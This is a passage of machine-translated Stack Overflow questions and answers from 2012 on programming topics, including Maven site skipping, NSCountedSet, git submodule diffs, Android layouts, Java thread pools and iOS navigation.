            title: 'Vbox', // this is better place for title and iconCls :)
            iconCls: 'action',
            items: [
                // title bar is here :) 
                {
                   type: 'titlebar',
                   docked: 'top',
                   title: 'Navigation',
                },
                {
                    xtype: 'panel',
                    html: 'baz',
                    style: 'background-color: #ff0',
                    flex: 1
                },
                {
                    xtype: 'panel',
                    html: 'foo',
                    style: 'background-color: #f00',
                    flex: 2
                },
                {
                    xtype: 'panel',                
                    html: 'bar',
                    style: 'background-color: #fff',
                    flex: 3
                }
            ]
        }
    }); 
```

在 MainView.js

```
Ext.define("SenchaFiddle.view.MainView", {
  extend: 'Ext.tab.Panel',
  // ...    
  config: {
    tabBarPosition: 'bottom',
    items: [
      {xtype: 'hbox-view'}, // very nice code :)
      {xtype: 'vbox-view'},
    ]
  }
}); 
```

# maven - Maven跳过站点/报告模块

> ID：10757089
> 
> 赞同：19
> 
> 时间：2012-05-25T15:21:25.283
> 
> 标签：maven, maven-site-plugin

我有一个多模块项目，在父 pom 中，我定义了几个报告插件。一些模块包含不需要针对它们运行报告插件的代码，我不需要将它们包含在生成的站点中。有没有办法告诉 Maven 在父 pom 级别忽略它们？

### 更新：

根据 ajozwik 的回答，我添加了跳过配置。我的 POM 现在如下所示...

**父/pom.xml**

```
<modules>
  <module>service</module>
  <module>client</module>
</modules>
<reporting>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-checkstyle-plugin</artifactId>
      <version>2.9.1</version>
    </plugin>
    <plugin>
      <groupId>org.codehaus.mojo</groupId>
      <artifactId>findbugs-maven-plugin</artifactId>
      <version>2.4.0</version>
    </plugin>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-javadoc-plugin</artifactId>
      <version>2.8.1</version>
    </plugin>
    <plugin>
      <groupId>org.codehaus.mojo</groupId>
      <artifactId>cobertura-maven-plugin</artifactId>
      <version>2.5.1</version>
      <configuration>
        <formats>
          <format>html</format>
        </formats>
      </configuration>
    </plugin>
  </plugins>   
</reporting> 
```

**客户端/pom.xml**

```
<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-site-plugin</artifactId>
      <version>3.1</version>
      <configuration>
        <skip>true</skip>
        <skipDeploy>true</skipDeploy>
      </configuration>
    </plugin>
  </plugins>
</build> 
```

当我执行时：

```
mvn clean package site 
```

构建成功，客户端的目标目录不包含生成的站点。当我运行时：

```
mvn clean package site site-stage 
```

为了暂存站点，它正确地暂存站点。如果没有 skipDeploy 标签，登台将失败......

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-31T20:54:04.000

您是否尝试过（在儿童 pom 中）？：

```
 <plugin>
          <groupId>org.apache.maven.plugins</groupId>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.1</version>
          <configuration>
                <skip>true</skip>
          </configuration>
        </plugin> 
```

* * *

**更新。** 您可以使用属性重新定义默认行为。让您的孩子保持简单。
在父 pom 集中（pluginManagement 或 plugins 部分）

```
 <properties>
    <maven-site-plugin.skip>false</maven-site-plugin.skip>
 </properties>

   <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-site-plugin</artifactId>
      <version>3.1</version>
      <configuration>
            <skip>${maven-site-plugin.skip}</skip>
      </configuration>
    </plugin> 
```

在父 pom 中重新定义`maven-site-plugin.skip`：

```
<properties>
    <maven-site-plugin.skip>true</maven-site-plugin.skip>
 </properties> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-08-14T08:56:27.937

您还可以在命令行上忽略报告生成：

```
mvn -DgenerateReports=false package 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-07-21T20:52:49.207

您还可以通过以下方式忽略报告生成：

例如 mvn -Dmaven.site.skip=true 全新安装

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2020-01-06T13:53:45.480

为了让 Sonar 运行覆盖，Jacoco 也可以这样配置；

```
 <plugin>
            <groupId>org.jacoco</groupId>
            <artifactId>jacoco-maven-plugin</artifactId>
            <version>0.8.5</version>
            <executions>
                <execution>
                    <id>default-prepare-agent</id>
                    <goals>
                        <goal>prepare-agent</goal>
                    </goals>
                </execution>
            </executions>
        </plugin> 
```

这将导致`/target/site/jacoco/jacoco.xml`您的项目没有文件，现在该`jacoco.exec`文件将用于 covarage 将按预期处理

# objective-c - NSCountedSet 是如何工作的？

> ID：10757090
> 
> 赞同：0
> 
> 时间：2012-05-25T15:21:30.060
> 
> 标签：objective-c, cocoa, nscountedset

我有以下代码

```
NSCountedSet *set = [[NSCountedSet alloc] init];
NSMutableString *lDesktopPath = [[NSMutableString alloc] initWithString:@"/Users/new/Desktop/"];
int i= 10;
while (i) 
{

    NSLog(@"%@", [NSString stringWithFormat:@"%@%d",[lDesktopPath stringByDeletingLastPathComponent],i]);
    [lDesktopPath setString:[NSString stringWithFormat:@"%@%d",[lDesktopPath stringByDeletingLastPathComponent],i ]];
    NSLog(@"%p", lDesktopPath);
    [set addObject:lDesktopPath];
    NSLog(@"%@", set);
    --i;
}
NSLog(@"%@", set); 
```

输出：

```
2012-05-25 20:41:37.619 NSCountableset[21955:a0f] /Users/new10
2012-05-25 20:41:37.621 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.623 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/Users/new10 [1])
2012-05-25 20:41:37.623 NSCountableset[21955:a0f] /Users9
2012-05-25 20:41:37.624 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.624 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/Users9 [1], /Users9 [1])
2012-05-25 20:41:37.625 NSCountableset[21955:a0f] /8
2012-05-25 20:41:37.625 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.625 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/8 [1], /8 [1], /8 [1])
2012-05-25 20:41:37.626 NSCountableset[21955:a0f] /7
2012-05-25 20:41:37.626 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.627 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/7 [1], /7 [1], /7 [2])
2012-05-25 20:41:37.627 NSCountableset[21955:a0f] /6
2012-05-25 20:41:37.628 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.628 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/6 [2], /6 [1], /6 [2])
2012-05-25 20:41:37.635 NSCountableset[21955:a0f] /5
2012-05-25 20:41:37.635 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.636 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/5 [2], /5 [2], /5 [2])
2012-05-25 20:41:37.636 NSCountableset[21955:a0f] /4
2012-05-25 20:41:37.640 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.640 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/4 [2], /4 [2], /4 [3])
2012-05-25 20:41:37.641 NSCountableset[21955:a0f] /3
2012-05-25 20:41:37.641 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.642 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/3 [3], /3 [2], /3 [3])
2012-05-25 20:41:37.642 NSCountableset[21955:a0f] /2
2012-05-25 20:41:37.643 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.643 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/2 [3], /2 [3], /2 [3])
2012-05-25 20:41:37.643 NSCountableset[21955:a0f] /1
2012-05-25 20:41:37.644 NSCountableset[21955:a0f] 0x100111ac0
2012-05-25 20:41:37.644 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/1 [3], /1 [3], /1 [4])
2012-05-25 20:41:37.644 NSCountableset[21955:a0f] <NSCountedSet: 0x1001114b0> (/1 [3], /1 [3], /1 [4]) 
```

我期待最终集中有 10 个不同的值，但最终集只包含 3 个相同的值，为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:41:30.187

好吧，我认为你的套装完全搞砸了。从指针 NSLog 可以看出，实际上每次都添加相同的可变字符串。但是当它在集合中时，你也在改变它。这必然意味着字符串的哈希值会发生变化`isEqual:`，据我所知，使用它的结果也会发生变化，这意味着该集合可能不再能够找到已经在其中的对象。

为什么你在这里使用可变字符串，特别是因为你已经创建了一个完全可以接受的不可变字符串（每次迭代两次）？像这样更改您的代码：

```
NSCountedSet *set = [[NSCountedSet alloc] init];
NSString *lDesktopPath = @"/Users/new/Desktop/";
int i= 10;
while (i) 
{
    lDeskTopPath = [NSString stringWithFormat:@"%@%d",[lDesktopPath stringByDeletingLastPathComponent], i];
    NSLog(@"%@", lDesktopPath);
    NSLog(@"%p", lDesktopPath);
    [set addObject:lDesktopPath];
    NSLog(@"%@", set);
    --i;
}
NSLog(@"%@", set); 
```

# git - git：所有已更改文件的列表，包括子模块中的文件

> ID：10757091
> 
> 赞同：41
> 
> 时间：2012-05-25T15:21:32.743
> 
> 标签：git, git-submodules, git-diff

我想获取所有文件的列表，这些文件在两次提交之间发生了变化，包括子模块中的那些。

我知道我可以这样做：

```
git diff --name-only --diff-filter=ACMR ${revision} HEAD 
```

它返回一个文件列表，包括子模块路径，但不包括其中的文件。

示例：我更新了一个子模块。我提交了这个超级项目。现在我想获取所有已修改文件的列表。

您知道完成此任务的方法吗？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-10-27T13:39:54.220

2017 年更新：正如我在“ [see diff of commit on submodule in gitlab](https://stackoverflow.com/a/40895712/6309) ”中提到的，

*   Git 2.11（2016 年 11 月）介绍

    ```
    git diff --submodule=diff 
    ```

*   Git 2.14（2017 年第三季度）将通过递归到嵌套子模块来改进这一点。
    请参阅[Stefan Beller (](https://github.com/stefanbeller) [)的](https://github.com/stefanbeller)[提交 5a52214](https://github.com/git/git/commit/5a5221427cb8b78c3246ffa305900db935017c54)（2017 年 5 月 4 日） 。^(（由)^([Junio C Hamano 合并 --](https://github.com/gitster)) ^([--](https://github.com/gitster))^在^([提交 a531ecf](https://github.com/git/git/commit/a531ecf399a5d2ddb97dbd79bbcdad2dd93e7268))^(中，2017 年 5 月 29 日）)[`stefanbeller`](https://github.com/stefanbeller)
    ^([`gitster`](https://github.com/gitster))

* * *

2012 年原始答案（2017 年 Git 2.14 之前）

也许一条简单的线就足够了：

```
git submodule foreach --recursive git diff --name-status 
```

这实际上会列出子模块中的子*模块*中的文件。
（`--recursive`选项来自git1.7.3+）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-01T01:46:28.003

您可以使用以下命令找出子模块在给定父模块提交时的版本`git ls-tree`：

```
subcommit=$(git ls-tree $parentcommit $submodulepath | awk '{print $3}') 
```

因此，这里有一个脚本，可以帮助您完成大部分工作，包括输出格式等：

```
#!/bin/sh

function compare {
    if [[ -z "$3" ]];
        then git diff --name-only --ignore-submodules=all --diff-filter=ACMR "$1" "$2"
        else git diff --name-only --ignore-submodules=all --diff-filter=ACMR "$1" "$2" | awk -v r=$3 '{ print "" r "/" $0}'
    fi

    for submodule in `git submodule | awk '{print $2}'`
    do
        old=$(git ls-tree $1 $submodule | awk '{print $3}')
        new=$(git ls-tree $2 $submodule | awk '{print $3}')
        (cd $submodule; compare $old $new $submodule)
    done
}

compare "$1" "$2" 
```

这将像这样输出所有文件（尽管 Base 是一个子模块）： HtmlTemplates/Css/Screen.css Base/Php/Classes/Helper.php

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-26T01:15:50.693

因此，与修订相比，列出所有更改的非常简单的脚本

```
#!/bin/sh
echo "Listing changes for super module"
git diff $1 --name-only
subs=(`git submodule | awk '{print $2}'`)
for sub in ${subs[*]}; do
   lastrevision=`git diff  $1 $sub | fgrep "Subproject" | head -n1 | awk '{print $3}'`
   cd $sub
   echo "Listing changes for $sub"
   git diff $lastrevision --name-only
   cd ..
done 
```

它需要一个参数-您要与之比较的修订版。确保有`fgrep "Subproject"`，没有`fgrep "Submodule"`。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-07-08T08:58:01.343

***2017 年 7 月 8 日***

现在要获得包括 a 的差异`submodule`，您可以使用命令 -

```
git diff --submodule=diff 
```

注意 - 这已在[Git 2.14.0中引入](https://github.com/git/git/blob/master/Documentation/RelNotes/2.14.0.txt#L44)

> “git diff --submodule=diff”现在递归到嵌套的子模块中。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2019-02-19T13:36:02.683

[Jamey Sharp的](https://stackoverflow.com/users/1787206/jamey-sharp)[https://stackoverflow.com/a/13169898/5438298](https://stackoverflow.com/a/13169898/5438298)的Windows 变体将是

```
@echo off
if NOT %1.==. goto has_rev1

@echo git diff --name-only including submodules
@echo usage:
@echo ^ ^ %~n0 ^<revision1^> [^<revision2^>^|HEAD]
@exit /b 1

:has_rev1
setlocal
set rev1=%1
if %2.==. (set rev2=HEAD) else (set rev2=%2)

call :show_diff %rev1% %rev2%
exit /b
::eof

:show_diff
setlocal ENABLEDELAYEDEXPANSION
for /f "tokens=*" %%l in ('git --no-pager diff --name-only --ignore-submodules^=all --line-prefix^=%3 %1 %2') do set fwds=%%l & set bcks=!fwds:/=\! & echo !bcks! 
endlocal
::git submodule is too slow for this
::for /f "tokens=2" %%d in ('git submodule') do call :subm %1 %2 %%d %3
if exist .gitmodules for /f "tokens=1,3*" %%p in (.gitmodules) do if %%p.==path. call :subm %1 %2 %%q %3
exit /b
::show_diff

:subm
setlocal
for /f "tokens=3" %%r in ('git ls-tree %1 %3') do set rev1=%%r
for /f "tokens=3" %%r in ('git ls-tree %2 %3') do set rev2=%%r

set fwdslash=%3
set bckslash=%fwdslash:/=\%

pushd %bckslash%
call :show_diff %rev1% %rev2% %4%bckslash%\
popd

endlocal
exit /b
::subm 
```

（请注意，子模块名称中的空格可能需要更多的双引号才能起作用）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-01-19T11:17:27.243

我现在使用 git 2.32.0：

git diff --submodule=diff

并使用正则表达式模式解析输出：“--- a/(.*)”

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2020-10-23T11:04:36.223

您可以使用

```
git -c color.diff=false diff --submodule=diff HEAD~1 HEAD | sed -n -e s/^diff\ --git\ a\\///p 
```

只需列出您的文件（以 HEAD~1 和 HEAD 作为示例参考）。

我更喜欢

```
git -c color.diff=false diff --submodule=diff HEAD~1 HEAD | grep -E "^(diff|Submodule)\ " 
```

按子模块对文件进行分组。根据终端的不同，使用“--no-pager”选项可能很重要，如下面的注释所示。

备注：我喜欢文件中完整的彩色差异，之后可以“htmlized”进行演示：

```
git -c color.diff=always --no-pager diff --submodule=diff HEAD~1 HEAD > diffFileName 
```

# excel - Excel：如何自动将多个 (28) 文件合并到一个文件 (工作表) 相同的列 (13) 中？

> ID：10757092
> 
> 赞同：0
> 
> 时间：2012-05-25T15:21:33.660
> 
> 标签：excel

如何自动将多个（28）文件合并到一个文件（工作表）相同的列（13）中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:27:26.763

请参阅我对类似问题的回答[。](https://stackoverflow.com/a/10109148/120097)基本上，您想为此使用 MS Access，而不是 Excel。

# android - 在 Android 布局上显示“帮助”覆盖

> ID：10757093
> 
> 赞同：8
> 
> 时间：2012-05-25T15:21:37.277
> 
> 标签：android, overlay

我正在开发一款适用于 Android 的游戏（Sky Hiking - [Google Play](https://play.google.com/store/apps/details?id=com.rachum.amir.skyhiking.android&feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5yYWNodW0uYW1pci5za3loaWtpbmcuYW5kcm9pZCJd)，[Github](https://github.com/Nurdok/Sky-Hiking)）。我想为游戏添加一个“帮助”选项，它将一个一个地检查游戏组件，用箭头指向它们，并有一个文本框说明它们的用途。我正在寻找实现这一目标的最佳方法的建议。我是否应该在包含箭头的游戏活动上显示一个巨大的（部分透明的）图像（我需要为游戏的每个组件的每个箭头提供一个图像）。

**编辑**：对于不同的屏幕尺寸也有这样做的问题。

这方面的最佳做法是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-11T10:25:48.517

这就是我在这种情况下会做的事情。它可能不是最好的解决方案，但无论屏幕大小如何，它都应该可以工作：

在循环中执行以下操作，对每个元素执行一次：

1.  获取元素在屏幕上的当前位置。
2.  在元素旁边的位置绘制箭头。你可以通过获取元素的X和Y坐标，加上一定的空间来得到这个位置。例如，如果元素位于 10、10，则在 25、25 处绘制箭头。您可以在决定绘制箭头的位置时考虑元素的宽度。您还应该检查左侧或右侧是否有更多可用空间，并在该侧绘制。此外，如果元素靠近中间，您可以在一侧绘制箭头，在另一侧绘制文本。
3.  绘制箭头后，您可以在屏幕的另一部分显示带有帮助内容的文本框。您可以将帮助内容存储在 XML 中，并为此元素显示适当的字符串。
4.  移除箭头和文本框，为下一个元素做准备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-13T11:24:03.770

我建议看看[PopupWindow](http://developer.android.com/reference/android/widget/PopupWindow.html)。它可以显示任意视图（您的指针和文本框），并且可以锚定到您选择的视图（您正在解释的视图）。

# java - 可恢复的 XML 解析

> ID：10757094
> 
> 赞同：2
> 
> 时间：2012-05-25T15:21:37.420
> 
> 标签：java, xml, xml-parsing

我有一个解析巨大 XML 的数据导入工具（它使用 SAX 解析器，但适应是我的最小问题）。发生故障、新部署、系统重启，我不想完全重新开始，所以我需要不时保存解析器状态（如果需要，我们可以将其称为 XML 游标）。

是否有任何解析器能够保存它们的状态并恢复它们（显然我必须在恢复时搜索文件）？

我还没有找到这样的解析器，所以我对此表示怀疑，所以这是我的第二个问题：您对我应该如何开始实施它有什么建议吗？采用 SAX 解析器实现并深入研究，还是从头开始会更好？

如果重要，我需要 xml 命名空间，但不需要模式/DTD 检查。

游标还可以用于预解析 xml 和分发工作以进行并行处理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:40:13.183

真的取决于内容，你能不能写一个 XQuery 来明确地在文件中找到一个节点。

例如`<Item id="1000"/>`

如果是这样，在成功解析节点后将其持久化，那么当您恢复时将其传入（null 等于从第一个开始）。然后移动到目标节点，移动到下一个，然后在 y va 上。

# java - 压力测试服务端点，使用 x 个线程发送 100K 请求

> ID：10757095
> 
> 赞同：2
> 
> 时间：2012-05-25T15:21:37.533
> 
> 标签：java, multithreading, concurrency, threadpool

我想对我的服务端点进行压力测试，发出 http POST 请求。

我希望解决方案能够：

1.  发出一定数量的请求，例如 100K
2.  继续运行 x 分钟

到目前为止，我使用 executorservice 创建了我的解决方案，例如：

```
int MAX_THREADS = 20;
int MAX_REQUESTS = 1000;

ExecutorService es = Executors.newFixedThreadPool(MAX_THREADS);

for(int x = 0; x < MAX_REQUESTS; x++) {
  es.execute(new MyTask());
}

es.shutdown();

try {
  es.awaitTermination(..);
}
catch(...) {

} 
```

MyTask 实现 Runnable 的地方，它使用 HttpClient (apache) 制作 HttpPost。

所以这会创建一组线程池，然后调用任务 x 次。

**如何修改它以使其也能够运行指定的分钟数？**

为了让我获得开始/结束时间统计信息，我将不得不使用期货，所以每个线程并返回正确运行所需的时间？

此外，在我的可运行任务中，我正在创建一个新的 HttpClient 对象实例，并加载一个随帖子发送的文件。我猜这会减慢我的基准测试速度，除了实际调用来发出请求之外，有没有办法在所有设置中重新使用 httpclient？

在任何人提到它之前，我知道已经有 jmeter 等工具可以做到这一点，但我想了解它是如何工作的，并且稍后我将做一些我想要完全控制的自定义事情。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:27:07.187

如果可以使用 Apache JMeter，为什么要自己制作？您可以制作一个简单的插件来满足您的应用程序需求，然后让 JMeter 的所有负载生成功能触手可及。包括间隔跑等等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:25:39.387

您应该做的是等待终止一段时间，然后调用`es.shutdownNow()`. 所以像：

```
// start your executor service like you do
// submit your jobs
// shutdown the service so no new jobs are added
es.shutdown();
try {
   // wait for it to complete for only a certain amount of time
   if (!es.awaitTermination(1\. TimeUnit.MINUTES)) {
       // if timed out waiting then flush remaining jobs and interrupt running
       es.shutdownNow();
       // now wait forever for it to finish after you've stopped the jobs
       es.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
   }
} catch(...) { 
```

我对此的一个问题是，在`shutdownNow()`你调用 _after 之后调用是否合法`shutdown()`。我对此不是 100% 确定的。

**注意：**如果您的任务长时间运行，则应注意`InterruptedException`并测试`Thread.currentThread().isInterrupted()`它们是否正在循环，以便可以`shutdownNow()`适当地中断它们。

# iphone - - (IBAction)doSomething:(id)sender 模型一般使用

> ID：10757101
> 
> 赞同：0
> 
> 时间：2012-05-25T15:21:52.910
> 
> 标签：iphone

所以我对某事感到好奇，不确定是否有“标准”或“良好”的编码实践。例如，如果您有一个带有 3 个按钮（如 facebook iphone 应用程序仪表板）的主页，通过按下视图控制器进入应用程序的各个部分，然后在一个按钮上，我会将 IBAction 绑定到它：

```
- (IBAction)showSummary:(id)sender {
    SummaryViewController *detailViewController = [[[SummaryViewController alloc] initWithNibName:@"SummaryViewController" bundle:nil] autorelease];
    detailViewController.view.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    detailViewController.view.autoresizesSubviews = YES;
    [self.navigationController pushViewController:detailViewController animated:YES];   
} 
```

所以我的第一个问题是，假设我第一次启动应用程序时，我想先显示这个页面。所以在viewDidLoad中，我可以调用这个方法吗

```
[self showSummary:nil]; 
```

还是在我的 viewDidLoad 中使用相同的代码更好。

关于这个的第二个问题是重构。如果我的所有 3 个按钮在创建 viewController 并将其推送到堆栈时做同样的事情，唯一的区别是哪个 viewController 初始化

例如

```
SummaryViewController *detailViewController = [[[SummaryViewController alloc] 
```

我应该重构这些方法吗？如果是这样，有什么好方法可以做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:23:17.513

问题1：不要重复代码只是使用`[self showSummary:nil];`

问题2：重复代码。它们是具有不同任务的不同对象，因此请将它们分开。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:32:30.463

我不会分别回答问题 1 和 2，而是建议对您的代码设计进行一些修改，以实际回答这两个问题。

绝对不要重复viewDidLoad中的代码。虽然这是一个简单的示例，但复制/粘贴代码绝不是一个好主意，不这样做的一个很好的理由是，当您在代码块中发现错误时，您必须在复制/粘贴的任何地方应用该更改它。很有可能，你要么会生气这样做，要么你会忘记一个地方并留下一个潜伏的错误。完成不复制/粘贴代码的最简单方法是简单地调用`[self showSummary:nil];` 我会建议一种更清洁的方法，因为从 viewDidLoad 的上下文中使用“sender”参数是没有意义的。

以下是我的建议（假设您已经将三个按钮设置为 button1、button2 和 button3。用您自己的变量替换这些变量）：

```
- (IBAction)showSummary:(id)sender {
    UIViewController *detailViewController = nil;
    if (sender == self.button1) {
        detailViewController = [[[SummaryViewController alloc] initWithNibName:@"SummaryViewController" bundle:nil] autorelease];
    } else if (sender == self.button2) {
        detailViewController = [[[SummaryViewController2 alloc] initWithNibName:@"SummaryViewController2" bundle:nil] autorelease];
    } else if (sender == self.button3) {
        detailViewController = [[[SummaryViewController3 alloc] initWithNibName:@"SummaryViewController3" bundle:nil] autorelease];
    }

    //You can accomplish these two lines in the nib file.  Do it there unless there's a reason to change these separately per controller, it simplifies the code
    //detailViewController.view.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    //detailViewController.view.autoresizesSubviews = YES;
    [self.navigationController pushViewController:detailViewController animated:YES];   
} 
```

然后从 viewDidLoad 调用指定要为其模拟操作的按钮的方法。

```
- (viewDidLoad) {
    [self showSummary:self.button1];
} 
```

现在有些人会争辩说这有点难以理解，因为作为查看您的代码的第 3 方人员，我想知道您为什么要将按钮传递给该方法。相反，您可以考虑将 showSummary 重构为一个额外的方法，该方法将翻译动作（按钮或其他标志）和实际执行动作（推动导航控制器）的逻辑分开。

# gcc - 如何将 Wintab 与 MinGW gcc 一起使用？

> ID：10757104
> 
> 赞同：3
> 
> 时间：2012-05-25T15:22:06.717
> 
> 标签：gcc, mingw

我想用 wintab 编程，这是大多数图形输入板制造商使用的标准库。

但是我发现的库不是开源的，可悲的是，它是一个 msvc dll，只有一个头文件。

现在我正在使用 MinGW gcc。

我在 MinGW 中尝试过 dlltool 和 dllwrap，但没有运气。我生成的 libxx.a 只能导致我的程序退出。（但它链接得很好）

我应该怎么做才能让 wintab 与 MinGW 一起工作？或者是否有来自 gcc 的 wintab dll 构建？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-16T23:40:57.953

您可以将 WinTab 与任何编译器套件一起使用，但不应将应用程序与库链接，以防它未安装在用户系统上。

相反，您应该在运行时使用`LoadLibrary()`and加载它`GetProcAddress()`，如下所述： [http ://www.wacomeng.com/windows/docs/WacomWindevFAQ.html#_Toc276983614](http://www.wacomeng.com/windows/docs/WacomWindevFAQ.html#_Toc276983614)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:25:12.943

如果 Wintab DLL 包含 C++ 代码，那么您就不走运了。我建议在 gdb 中运行程序，看看究竟是什么失败了。

# objective-c - 导航控制器中“返回”的侦听器

> ID：10757115
> 
> 赞同：2
> 
> 时间：2012-05-25T15:22:40.367
> 
> 标签：objective-c, ios, xcode, ios5, uinavigationcontroller

我找到了很多关于这个问题的旧答案，但它们都是 2 岁以上。

我想为左按钮添加监听器 - “后退”按钮。我想显示 UIAlertView 然后等待响应 - 是/否。

是否可以在较新的 SDK 中使用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-29T16:10:06.003

是的，您可以通过自己捕获和处理后退按钮的事件来做到这一点：

```
self.navigationItem.backBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Back" style:UIBarButtonItemStyleBordered target:self action:@selector(backButtonPressed:)]; 
```

您可以在方法中显示警报：

```
- (void)backButtonPressed:(id)sender {
UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Notice" message:@"Going back?" delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Ok"];
[alert show];
} 
```

然后在 UIAlertDelegate 方法中

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
    if (buttonIndex == 1) { // Button index: Cancel = 0; Ok = 1; 
        [self.navigationController popViewControllerAnimated:YES];
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:50:58.593

您可以“欺骗”系统以使用您自己的箭头形“后退”按钮显示自定义 UINavigationBar - 这样您就可以完全操纵行为而不受限于默认行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T15:29:09.647

这是一种方法。我不确定这是否是唯一的方法，但这对我有用：

```
- (void)viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];

    if (animated) {
        NSLog(@"User pressed Back button");

    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-29T15:43:45.127

目前还不是很清楚你想要做什么。什么对象在听？屏幕上的一个还是导航堆栈中的一个但不在屏幕上？UIAlertView 的目的是什么？你需要用户的回应吗？响应后应该发生什么？

可能有一种方法可以将 KVO 添加到导航栏属性，但我认为更好的方法（如果您的目标是 5.0 和更高版本）是使用自定义 Segue 类。使用自定义转场，您可以完全自定义整个过渡过程。如果您想查看实际操作，请在此处评论您正在寻找的行为的细节，我会用一个例子来回应。

另一种选择可能是将 UINavigationController 子类化，这在 5.0 和更高版本中也是可能的，但我还没有尝试过，因为我认为它可能会打开一罐蠕虫。

如果您的目标是 5.0 之前的版本，我认为最好的方法是使用您自己的后退按钮和自定义行为。

# android - 安卓：INSTALL_FAILED_MISSING_SHARED_LIBRARY

> ID：10757116
> 
> 赞同：0
> 
> 时间：2012-05-25T15:22:56.470
> 
> 标签：android, shared-libraries

我正在尝试在我的 Android 应用程序中使用以下库：

[http://www.jjoe64.com/p/graphview-library.html](http://www.jjoe64.com/p/graphview-library.html)

我下载了 .jar 文件并将其添加到 Java 构建路径，但出现以下错误：

```
java.lang.NoClassDefFoundError: com.jjoe64.graphview.GraphView$GraphViewData[] 
```

经过进一步调查，我发现我必须在“应用程序”下的 AndroidManifest 中使用“uses-library”标签。

但是，我不知道在 android:name 下输入什么。

```
<uses-library android:name="com.jjoe64.graphview"></uses-library> 
```

我尝试了这个和其他变体，但它导致 INSTALL_FAILED_MISSING_SHARED_LIBRARY 安装错误。

我该怎么办？

谢谢

编辑：问题已回答。我该如何关闭它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:30:02.533

没关系。弄清楚了。

我将 Eclipse 的 Android ADT 更新到版本 18。所以我需要将我的库文件夹从“lib”重命名为“libs”，以便它识别类路径。我还从 Manifest 中删除了 uses-library 标记。

希望这对未来的人们有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:30:23.033

Project properties->Java Build Path->Order and Export，检查lib jar。
那应该导出您正在使用的库，因此您不应该收到您提到的错误

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-17T02:20:43.697

Project properties->Java Build Path->Order and Export，检查lib jar。并且不需要您为 AndroidManifest.xml 付出的努力，因此您可以将其删除。当我使用第三方 jar 时，我遇到了同样的问题。我通过您回答下的两条评论解决了这个问题。

# ios - 创建复杂 Core Data 数据库的技巧

> ID：10757127
> 
> 赞同：0
> 
> 时间：2012-05-25T15:23:28.140
> 
> 标签：ios, core-data, one-to-many

